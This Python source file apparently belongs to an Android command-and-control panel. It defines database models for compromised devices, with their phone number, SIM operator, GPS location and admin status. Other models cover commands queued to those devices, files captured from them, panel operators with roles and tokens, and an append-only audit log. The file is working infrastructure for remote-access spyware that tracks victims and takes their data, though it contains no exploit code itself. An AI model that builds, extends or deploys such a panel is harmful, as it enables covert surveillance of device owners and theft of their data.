import json
from datetime import timedelta

from database import db
from c2.timeutil import utcnow


class Device(db.Model):
    __tablename__ = "devices"
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(64), unique=True, nullable=False, index=True)
    model = db.Column(db.String(128))
    manufacturer = db.Column(db.String(128))
    android_version = db.Column(db.String(32))
    sdk_int = db.Column(db.Integer)
    hostname = db.Column(db.String(128))
    ip_address = db.Column(db.String(64))
    country = db.Column(db.String(64))
    city = db.Column(db.String(64))
    latitude = db.Column(db.Float, default=0.0)
    longitude = db.Column(db.Float, default=0.0)
    battery = db.Column(db.Integer, default=0)
    is_charging = db.Column(db.Boolean, default=False)
    screen_on = db.Column(db.Boolean, default=False)
    is_admin = db.Column(db.Boolean, default=False)
    sim_operator = db.Column(db.String(64))
    phone_number = db.Column(db.String(32))
    carrier_ip = db.Column(db.String(64))
    first_seen = db.Column(db.DateTime, default=utcnow)
    last_seen = db.Column(db.DateTime, default=utcnow)
    is_online = db.Column(db.Boolean, default=True)
    tags = db.Column(db.String(256), default="")
    notes = db.Column(db.Text, default="")

    # JSON array of command types this device's build implements. NULL means
    # the agent never declared, which is treated as "assume full catalogue"
    # rather than "assume broken" — see c2/command_builder.catalog_for.
    capabilities = db.Column(db.Text, nullable=True)
    agent_version = db.Column(db.String(32))

    commands = db.relationship("Command", backref="device", lazy="dynamic",
                               cascade="all, delete-orphan")
    files = db.relationship("CapturedFile", backref="device", lazy="dynamic",
                            cascade="all, delete-orphan")

    def tag_list(self):
        return [t.strip() for t in (self.tags or "").split(",") if t.strip()]

    def is_stale(self, timeout_seconds: int) -> bool:
        if not self.last_seen:
            return True
        return utcnow() - self.last_seen > timedelta(seconds=timeout_seconds)

    def set_capabilities(self, names) -> None:
        """Persist a declared capability set, ignoring unparseable input."""
        from c2.command_builder import parse_capabilities

        if names is None:
            return
        self.capabilities = json.dumps(sorted(parse_capabilities(names)))

    def capability_list(self):
        from c2.command_builder import capabilities_of

        return capabilities_of(self)

    def to_dict(self):
        return {
            "id": self.id,
            "device_id": self.device_id,
            "model": self.model,
            "manufacturer": self.manufacturer,
            "android_version": self.android_version,
            "sdk_int": self.sdk_int,
            "hostname": self.hostname,
            "ip_address": self.ip_address,
            "country": self.country,
            "city": self.city,
            "latitude": self.latitude,
            "longitude": self.longitude,
            "battery": self.battery,
            "is_charging": self.is_charging,
            "screen_on": self.screen_on,
            "is_admin": self.is_admin,
            "sim_operator": self.sim_operator,
            "phone_number": self.phone_number,
            "first_seen": self.first_seen.isoformat() if self.first_seen else None,
            "last_seen": self.last_seen.isoformat() if self.last_seen else None,
            "is_online": self.is_online,
            "tags": self.tag_list(),
            "notes": self.notes,
            "agent_version": self.agent_version,
            # sorted list, not the set: jsonify cannot serialise a set
            "capabilities": sorted(self.capability_list() or []),
            "coverage": self.coverage_dict(),
        }

    def coverage_dict(self):
        from c2.command_builder import coverage

        return coverage(self)


class Command(db.Model):
    __tablename__ = "commands"
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.Integer, db.ForeignKey("devices.id"), nullable=False)
    command_type = db.Column(db.String(64), nullable=False)
    payload = db.Column(db.Text, default="{}")
    status = db.Column(db.String(32), default="pending")
    result = db.Column(db.Text, default="")
    created_at = db.Column(db.DateTime, default=utcnow)
    delivered_at = db.Column(db.DateTime)
    completed_at = db.Column(db.DateTime)

    def args(self):
        import json

        try:
            return json.loads(self.payload or "{}")
        except (ValueError, TypeError):
            return {}

    def to_dict(self):
        return {
            "id": self.id,
            "device_id": self.device_id,
            "command_type": self.command_type,
            "payload": self.args(),
            "status": self.status,
            "result": self.result,
            "created_at": self.created_at.isoformat() if self.created_at else None,
            "delivered_at": self.delivered_at.isoformat() if self.delivered_at else None,
            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
        }


class CapturedFile(db.Model):
    __tablename__ = "captured_files"
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.Integer, db.ForeignKey("devices.id"), nullable=False)
    command_id = db.Column(db.Integer, db.ForeignKey("commands.id"))
    category = db.Column(db.String(32))
    filename = db.Column(db.String(256))
    stored_path = db.Column(db.String(512))
    sha256 = db.Column(db.String(64))
    size_bytes = db.Column(db.Integer, default=0)
    mime_type = db.Column(db.String(128))
    captured_at = db.Column(db.DateTime, default=utcnow)
    metadata_json = db.Column(db.Text, default="{}")

    # NB: not named `metadata` — that attribute belongs to SQLAlchemy's
    # declarative base and shadowing it breaks table construction.
    def meta(self):
        import json

        try:
            return json.loads(self.metadata_json or "{}")
        except (ValueError, TypeError):
            return {}

    def to_dict(self):
        return {
            "id": self.id,
            "device_id": self.device_id,
            "command_id": self.command_id,
            "category": self.category,
            "filename": self.filename,
            "stored_path": self.stored_path,
            "sha256": self.sha256,
            "size_bytes": self.size_bytes,
            "mime_type": self.mime_type,
            "captured_at": self.captured_at.isoformat() if self.captured_at else None,
            "metadata": self.meta(),
            "url": f"/api/file/{self.id}/raw",
        }


class Operator(db.Model):
    """A named human (or machine) that can act on the panel.

    Replaces the single shared password. With one shared secret the audit
    trail could only ever say "operator", which makes it a log rather than an
    accountability record.

    Two credential kinds, both stored hashed and never recoverable:
      * ``password_hash`` — scrypt via werkzeug, for the login form
      * ``token_hash``     — sha256, for ``Authorization: Bearer`` machine
                             clients. Indexed because lookup is by hash.
    """

    __tablename__ = "operators"
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(64), unique=True, nullable=False, index=True)
    password_hash = db.Column(db.String(255), nullable=False)
    token_hash = db.Column(db.String(64), nullable=True, index=True)

    # "admin" may queue commands and manage operators; "viewer" is read-only.
    role = db.Column(db.String(16), default="admin", nullable=False)
    disabled = db.Column(db.Boolean, default=False, nullable=False)

    created_at = db.Column(db.DateTime, default=utcnow, nullable=False)
    last_login = db.Column(db.DateTime)
    last_login_ip = db.Column(db.String(64))

    def has_token(self) -> bool:
        return bool(self.token_hash)

    def to_dict(self):
        return {
            "id": self.id,
            "name": self.name,
            "role": self.role,
            "disabled": self.disabled,
            "has_token": self.has_token(),
            "token_fp": self.token_fingerprint(),
            "created_at": self.created_at.isoformat() if self.created_at else None,
            "last_login": self.last_login.isoformat() if self.last_login else None,
            "last_login_ip": self.last_login_ip,
        }

    def token_fingerprint(self):
        if not self.token_hash:
            return None
        import hashlib

        return hashlib.sha256(self.token_hash.encode()).hexdigest()[:8]


class OperatorAction(db.Model):
    """Append-only record of operator-initiated actions.

    There is deliberately no `updated_at` and no mutation helper. Rows are
    written once by ``c2.audit.record`` and never again; the digest chain in
    that module is what makes that claim checkable rather than aspirational.
    """

    __tablename__ = "operator_actions"
    id = db.Column(db.Integer, primary_key=True)
    created_at = db.Column(db.DateTime, default=utcnow, nullable=False, index=True)
    actor = db.Column(db.String(128), nullable=False, index=True)
    action = db.Column(db.String(64), nullable=False, index=True)

    # Both forms kept: device_pk survives a device being deleted, device_id
    # stays readable when the row is orphaned.
    device_pk = db.Column(db.Integer, index=True)
    device_id = db.Column(db.String(64), index=True)
    command_id = db.Column(db.Integer)
    command_type = db.Column(db.String(64))

    outcome = db.Column(db.String(16), default="ok", index=True)
    detail_json = db.Column(db.Text, default="{}")
    request_json = db.Column(db.Text, default="{}")
    digest = db.Column(db.String(64))

    def detail(self):
        import json as _json

        try:
            return _json.loads(self.detail_json or "{}")
        except (ValueError, TypeError):
            return {}

    def request_info(self):
        import json as _json

        try:
            return _json.loads(self.request_json or "{}")
        except (ValueError, TypeError):
            return {}

    def to_dict(self):
        return {
            "id": self.id,
            "at": self.created_at.isoformat() if self.created_at else None,
            "actor": self.actor,
            "action": self.action,
            "device_pk": self.device_pk,
            "device_id": self.device_id,
            "command_id": self.command_id,
            "command_type": self.command_type,
            "outcome": self.outcome,
            "detail": self.detail(),
            "request": self.request_info(),
            "digest": (self.digest or "")[:12],
        }


class LogEntry(db.Model):
    __tablename__ = "logs"
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.Integer, db.ForeignKey("devices.id"))
    level = db.Column(db.String(16), default="info")
    message = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=utcnow)

    def to_dict(self):
        return {
            "id": self.id,
            "device_id": self.device_id,
            "level": self.level,
            "message": self.message,
            "created_at": self.created_at.isoformat() if self.created_at else None,
        }